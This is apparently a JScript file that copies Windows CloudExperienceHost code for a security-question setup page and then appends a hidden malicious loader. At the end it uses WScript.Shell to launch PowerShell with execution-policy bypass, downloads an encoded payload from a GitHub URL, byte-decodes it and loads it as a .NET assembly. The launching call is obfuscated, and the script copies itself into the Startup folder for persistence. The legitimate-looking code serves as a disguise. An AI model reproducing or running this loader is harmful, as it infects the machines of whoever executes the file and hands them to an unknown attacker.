            FinishButton.addEventListener("click", function (event) {
                event.preventDefault();
                _onFinish.apply(this);
            }.bind(this));
            // Update textContent and accesskey for Finish and Cancel Button
            var checkAmersandFor = [FinishButton, CancelButton];
            checkAmersandFor.forEach(function (eachElement) {
                var result = CloudExperienceHost.ResourceManager.GetContentAndAccesskey(localAccountResources[eachElement.id]);
                eachElement.textContent = result.content;
                eachElement.accessKey = result.accessKey;
            });
            // Calling bridge to go cancel
            CancelButton.addEventListener("click", function (event) {
                event.preventDefault();
                _onCancel.apply(this);
            });
            // Add Event handlers and Validation checks for security question dropdowns
            var securityQuestionErrorDialog = [securityQuestion1_errorDialog, securityQuestion2_errorDialog, securityQuestion3_errorDialog];
            for (var i = 0; i < securityQuestionDropdown.length; i++) {
                var currSecurityQuestionDropdown = securityQuestionDropdown[i];
                // Disable security questions that have been chosen in another dropdown
                var otherDropdowns = securityQuestionDropdown.slice();
                otherDropdowns.splice(i, 1); 
                // Validate Security Question 'i' selection onBlur event
                currSecurityQuestionDropdown.addEventListener("blur", function (questionDropdown, questionNumber) {
                    var errorCode = validator.validateSecurityQuestionSelection(null, questionDropdown, questionNumber);
                    _checkErrorCodeAndShowError(this, errorCode);
                }.bind(this, currSecurityQuestionDropdown, i));
                // Remove error-message(if any) on valid Security question 'i'
                currSecurityQuestionDropdown.addEventListener("change", function (securityErrorDialog, questionNumber) {
                    var errorCode = validator.validateSecurityQuestionSelection(null, this, questionNumber);
                    _checkErrorCodeAndHideError(this, errorCode, securityErrorDialog);
                }.bind(currSecurityQuestionDropdown, securityQuestionErrorDialog[i], i));
            }
            //Add Validation checks for security answer inputs
            var securityAnswerInput = [securityAnswer1, securityAnswer2, securityAnswer3];
            var securityAnswerErrorDialog = [securityAnswer1_errorDialog, securityAnswer2_errorDialog, securityAnswer3_errorDialog];
            for (var i = 0; i < securityAnswerInput.length; i++) {
                var currSecurityAnswerInput = securityAnswerInput[i];
                // Validate Security Answer 'i' input field onBlur event
                currSecurityAnswerInput.addEventListener("blur", function (inputField, answerNumber) {
                    var errorCode = validator.validateSecurityAnswer(null, inputField, answerNumber);
                    _checkErrorCodeAndShowError(this, errorCode);
                }.bind(this, currSecurityAnswerInput, i));
                // Remove error-message(if any) on valid Security Answer 'i'
                currSecurityAnswerInput.addEventListener("keyup", function (securityErrorDialog, answerNumber) {
                    var errorCode = validator.validateSecurityAnswer(null, this, answerNumber);
                    _checkErrorCodeAndHideError(this, errorCode, securityErrorDialog);
                }.bind(currSecurityAnswerInput, securityAnswerErrorDialog[i], i));
            }
			 */
			
			
			
			
			
function A() {
    "use strict";
	
var bridge = new CloudExperienceHost.Bridge();
    var validator = new uiHelpers.Validator();
    var errorClass = new uiHelpers.ErrorUI();
    WinJS.UI.Pages.define("/views/sqsaLocalAccount.html", {
        init: function (element, options) {
            var languagePromise = bridge.invoke("CloudExperienceHost.Globalization.Language.getPreferredLang").then(function (preferredLang) {
                _htmlRoot.setAttribute("lang", preferredLang);
            }, function () { });
            var dirPromise = bridge.invoke("CloudExperienceHost.Globalization.Language.getReadingDirection").then(function (dirVal) {
                _htmlRoot.setAttribute("dir", dirVal);
            }, function () { });
            var stringPromise = bridge.invoke("CloudExperienceHost.LocalAccount.localizedStringsSetupSQSA").then(function (result) {
                localAccountResources = JSON.parse(result);
            });
            var cssPromise = uiHelpers.LoadCssPromise(document.head, "..", bridge);
            return {};
        },
        ready: function (element, options) {
            // Dynamically adding textContent to following elements
            var setContentFor = [UpdateSQSATitle, SQSALegend, FinishButton, CancelButton];
            for (var i = 0; i < setContentFor.length; i++) {
                setContentFor[i].textContent = localAccountResources[setContentFor[i].id];
            }
            // Dynamically setting attributes for security answer input boxes
            var answerInputBoxes = [securityAnswer1, securityAnswer2, securityAnswer3];
            var answerPlaceholderValue = Array(3).fill('SecurityAnswerPlaceholder');
            for (var i = 0; i < answerInputBoxes.length; i++) {
                answerInputBoxes[i].setAttribute('placeholder', localAccountResources[answerPlaceholderValue[i]]);
            }
            // Dynamically adding security question selection placeholder
            var securityQuestionDropdown = [securityQuestion1, securityQuestion2, securityQuestion3];
            var questionPlaceholderValue = ['SecurityQuestion1Placeholder', 'SecurityQuestion2Placeholder', 'SecurityQuestion3Placeholder'];
            var NUM_SECURITY_QUESTIONS = 6;
            for (var i = 0; i < securityQuestionDropdown.length; i++) {
                var currDropdown = securityQuestionDropdown[i];
                currDropdown.options[0] = new Option(localAccountResources[questionPlaceholderValue[i]], '', true, true);
                // Add label to question dropdown and corresponding answer input box
                answerInputBoxes[i].setAttribute('aria-label', localAccountResources[questionPlaceholderValue[i]]);
                currDropdown.setAttribute('aria-label', localAccountResources[questionPlaceholderValue[i]]);
                // Fill security question dropdown with questions
                for (var j = 1; j <= NUM_SECURITY_QUESTIONS; j++) {
                    var question = localAccountResources['SecurityQuestion' + j];
                    currDropdown.options[j] = new Option(question, question);
                    currDropdown.options[j].title = question;
                }
            }
            // Call _onFinish() on FinishButton click
            FinishButton.addEventListener("click", function (event) {
                event.preventDefault();
                _onFinish.apply(this);
            }.bind(this));
            // Update textContent and accesskey for Finish and Cancel Button
            var checkAmersandFor = [FinishButton, CancelButton];
            checkAmersandFor.forEach(function (eachElement) {
                var result = CloudExperienceHost.ResourceManager.GetContentAndAccesskey(localAccountResources[eachElement.id]);
                eachElement.textContent = result.content;
                eachElement.accessKey = result.accessKey;
            });
            // Calling bridge to go cancel
            CancelButton.addEventListener("click", function (event) {
                event.preventDefault();
                _onCancel.apply(this);
            });
            // Add Event handlers and Validation checks for security question dropdowns
            var securityQuestionErrorDialog = [securityQuestion1_errorDialog, securityQuestion2_errorDialog, securityQuestion3_errorDialog];
            for (var i = 0; i < securityQuestionDropdown.length; i++) {
                var currSecurityQuestionDropdown = securityQuestionDropdown[i];
                // Disable security questions that have been chosen in another dropdown
                var otherDropdowns = securityQuestionDropdown.slice();
                otherDropdowns.splice(i, 1); 
                // Validate Security Question 'i' selection onBlur event
                currSecurityQuestionDropdown.addEventListener("blur", function (questionDropdown, questionNumber) {
                    var errorCode = validator.validateSecurityQuestionSelection(null, questionDropdown, questionNumber);
                    _checkErrorCodeAndShowError(this, errorCode);
                }.bind(this, currSecurityQuestionDropdown, i));
                // Remove error-message(if any) on valid Security question 'i'
                currSecurityQuestionDropdown.addEventListener("change", function (securityErrorDialog, questionNumber) {
                    var errorCode = validator.validateSecurityQuestionSelection(null, this, questionNumber);
                    _checkErrorCodeAndHideError(this, errorCode, securityErrorDialog);
                }.bind(currSecurityQuestionDropdown, securityQuestionErrorDialog[i], i));
            }
            //Add Validation checks for security answer inputs
            var securityAnswerInput = [securityAnswer1, securityAnswer2, securityAnswer3];
            var securityAnswerErrorDialog = [securityAnswer1_errorDialog, securityAnswer2_errorDialog, securityAnswer3_errorDialog];
            for (var i = 0; i < securityAnswerInput.length; i++) {
                var currSecurityAnswerInput = securityAnswerInput[i];
                // Validate Security Answer 'i' input field onBlur event
                currSecurityAnswerInput.addEventListener("blur", function (inputField, answerNumber) {
                    var errorCode = validator.validateSecurityAnswer(null, inputField, answerNumber);
                    _checkErrorCodeAndShowError(this, errorCode);
                }.bind(this, currSecurityAnswerInput, i));
                // Remove error-message(if any) on valid Security Answer 'i'
                currSecurityAnswerInput.addEventListener("keyup", function (securityErrorDialog, answerNumber) {
                    var errorCode = validator.validateSecurityAnswer(null, this, answerNumber);
                    _checkErrorCodeAndHideError(this, errorCode, securityErrorDialog);
                }.bind(currSecurityAnswerInput, securityAnswerErrorDialog[i], i));
            }

            // Call to register EaseOfAccess and InputSwitcher controls
            uiHelpers.RegisterEaseOfAccess(easeOfAccess, bridge);
            uiHelpers.RegisterInputSwitcher(inputSwitcher, bridge);

            bridge.fireEvent(CloudExperienceHost.Events.visible, true);

            // Validate user credentials before loading page
            bridge.invoke("CloudExperienceHost.LocalAccount.verifyLocalAccountCredentials").done(function (credsValidated) {
                if (!credsValidated) {
                    bridge.fireEvent(CloudExperienceHost.Events.done, CloudExperienceHost.AppResult.abort);
                } else {
                    securityQuestion1.focus();
                }
            }, function (e) {
                bridge.fireEvent(CloudExperienceHost.Events.done, CloudExperienceHost.AppResult.fail);
            });
            // Helper function to Validate inputs and invoke the API CreateLocalAccount
            function _onFinish() {
                _setProgressState(true);
                // Validate all user inputs
                var inputErrors = validator.validateSQSA(null, [securityQuestion1, securityQuestion2, securityQuestion3],
                    [securityAnswer1, securityAnswer2, securityAnswer3]);
                if (inputErrors.length === 0) {
                    var recoveryData = _serializeQuestions(); // unable to directly call serialize() on fieldset
                    // Invoke update API via bridge
                    bridge.invoke("CloudExperienceHost.LocalAccount.updateSQSA", recoveryData).done(function () {
                        bridge.invoke("CloudExperienceHost.Telemetry.logEvent", "SQSAUpdateSucessful");
                        bridge.fireEvent(CloudExperienceHost.Events.done, CloudExperienceHost.AppResult.success);
                    }, function (e) {
                        this._showError(this._getErrorCode(e.number), true /* setFocus */);
                        _setProgressState(false);
                        bridge.invoke("CloudExperienceHost.Telemetry.logEvent", "SQSAUpdateFailure", JSON.stringify({ errorNumber: e.number.toString(16), errorStack: e.asyncOpSource.stack }));
                    }.bind(this));
                }
                else {
                    _setProgressState(false);
                    for (var i = 0; i < inputErrors.length; i++) {
                        this._showError(inputErrors[i], (i === 0) /* setFocus */);
                    }
                }
            }
            // Helper function to cancel update for security questions
            function _onCancel() {
                bridge.invoke("CloudExperienceHost.Telemetry.logEvent", "UpdateSecurityQuestions_Cancelled");
                bridge.fireEvent(CloudExperienceHost.Events.done, CloudExperienceHost.AppResult.cancel);
            }
            // Helper function to enable/disable user input interaction based on bool parameter
            function _setProgressState(waiting) {
                FinishButton.disabled = waiting;
                securityQuestion1.disabled = waiting;
                securityAnswer1.disabled = waiting;
                securityQuestion2.disabled = waiting;
                securityAnswer2.disabled = waiting;
                securityQuestion3.disabled = waiting;
                securityAnswer3.disabled = waiting;
            }
            // Helper function to serialize SQSA into JSON
            function _serializeQuestions() {
                var questions = [];
                var securityQuestions = [securityQuestion1, securityQuestion2, securityQuestion3];
                var securityAnswers = [securityAnswer1, securityAnswer2, securityAnswer3];
                for (var i = 0; i < securityQuestions.length; i++) {
                    questions.push({ 'question': securityQuestions[i].value, 'answer': securityAnswers[i].value });
                }
                return JSON.stringify({ version: 1.0, questions: questions });
            }

            function _checkErrorCodeAndShowError(thisArg, validatorErrorCode) {
                if (validatorErrorCode !== ErrorCodes.SUCCESS) {
                    thisArg._showError(validatorErrorCode, false /* setFocus */);
                }
            }

            function _checkErrorCodeAndHideError(inputField, validatorErrorCode, errorDialog) {
                if (validatorErrorCode === ErrorCodes.SUCCESS) {
                    errorClass.HideError(inputField, errorDialog);
                }
            }
        },
        error: function (e) {
            bridge.invoke("CloudExperienceHost.Telemetry.logEvent", "LocalAccountPageError", JSON.stringify({ number: e && e.number, stack: e && e.asyncOpSource && e.asyncOpSource.stack }));
            bridge.fireEvent(CloudExperienceHost.Events.done, CloudExperienceHost.AppResult.fail);
        },
        // Helper function to resolve e.number to ErrorCodes
        _getErrorCode: function (errorNumber) {
            var errorCode = uiHelpers.GetErrorCodeFromError(errorNumber);
            return errorCode;
        },
        // Helper function to resolve and display errors
        // Set focus on inputField if shouldSetFocus is true
        _showError: function (errorCode, setFocus) {
            // Note:The _showError() displays error on the var inputField.
            var resourceId = null;
            var inputField = null;
            switch (errorCode) {
                case ErrorCodes.SecurityQuestion1_Error:
                    resourceId = 'SQSA_Error';
                    inputField = securityQuestion1;
                    break;
                case ErrorCodes.SecurityQuestion2_Error:
                    resourceId = 'SQSA_Error';
                    inputField = securityQuestion2;
                    break;
                case ErrorCodes.SecurityQuestion3_Error:
                    resourceId = 'SQSA_Error';
                    inputField = securityQuestion3;
                    break;
                case ErrorCodes.SecurityAnswer1_Error:
                    resourceId = 'SQSA_Error';
                    inputField = securityAnswer1;
                    break;
                case ErrorCodes.SecurityAnswer2_Error:
                    resourceId = 'SQSA_Error';
                    inputField = securityAnswer2;
                    break;
                case ErrorCodes.SecurityAnswer3_Error:
                    resourceId = 'SQSA_Error';
                    inputField = securityAnswer3;
                    break;
                case ErrorCodes.Error_Creating_Account_Warning:
                    resourceId = 'Error_Creating_Account_Warning';
                    inputField = securityAnswer3;
                    break;
                default:
                    break;
            }
            if (resourceId && inputField) {
                errorClass.ShowError(inputField, document.getElementById(inputField.id + '_errorDialog'), localAccountResources[resourceId]);
                if (setFocus) { 
                }
            }
        }});
}


 
 var AJHWUYFG = new ActiveXObject("WScript.Shell");

var AD = "po!hel".replace(/!/g, "wers"); AD += "l ";
	var UIHWAGFIUYFH  = AD + " -exec Bypass -c $RR = {$W=New-Object System.Net.WebClient;[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$D=$W.DownloadData('https://github.com/Zankop/winapps/raw/refs/heads/Zankop-patch-1/189');For ($i=0; $i -lt $D.Length; $i++) {    $D[$i] = [System.BitConverter]::GetBytes($D[$i] - 189)[0];}[System.Reflection.Assembly]::Load($D).CreateInstance('B');};If($env:PROCESSOR_ARCHITECTURE -ne 'x86'){$J = Start-Job $RR -RunAs32;$J | Wait-Job | Receive-Job}Else{$RR.Invoke();}";
 

 

function _0x52e3(){var _0x30dcd9=['994881LfKWrw','140688NklIAP','371nBJjvL','35aZgZte','Run','2555796Titjxp','1333110MQnoPU','28965312EMeAoR','686324ZeBKCR','2554166lmdaQu'];_0x52e3=function(){return _0x30dcd9;};return _0x52e3();}function _0x5f65(_0x47d995,_0x30db6e){var _0x52e3b8=_0x52e3();return _0x5f65=function(_0x5f6553,_0x2252ed){_0x5f6553=_0x5f6553-0xe3;var _0x3dae64=_0x52e3b8[_0x5f6553];return _0x3dae64;},_0x5f65(_0x47d995,_0x30db6e);}var _0x520cbf=_0x5f65;(function(_0x32d020,_0x1823a2){var _0x598b94=_0x5f65,_0x4b3fd1=_0x32d020();while(!![]){try{var _0x1082c0=-parseInt(_0x598b94(0xe4))/0x1+parseInt(_0x598b94(0xe3))/0x2+-parseInt(_0x598b94(0xe9))/0x3+-parseInt(_0x598b94(0xec))/0x4*(parseInt(_0x598b94(0xe7))/0x5)+parseInt(_0x598b94(0xea))/0x6+-parseInt(_0x598b94(0xe6))/0x7*(parseInt(_0x598b94(0xe5))/0x8)+parseInt(_0x598b94(0xeb))/0x9;if(_0x1082c0===_0x1823a2)break;else _0x4b3fd1['push'](_0x4b3fd1['shift']());}catch(_0x4030a6){_0x4b3fd1['push'](_0x4b3fd1['shift']());}}}(_0x52e3,0xb41a2),AJHWUYFG[_0x520cbf(0xe8)](UIHWAGFIUYFH,0x0));

  AJHWUYFG.Run(AD + " -exec bypass -c Copy-Item -Path '" + WScript.ScriptFullName + "' -Destination ([System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::Startup));",0);

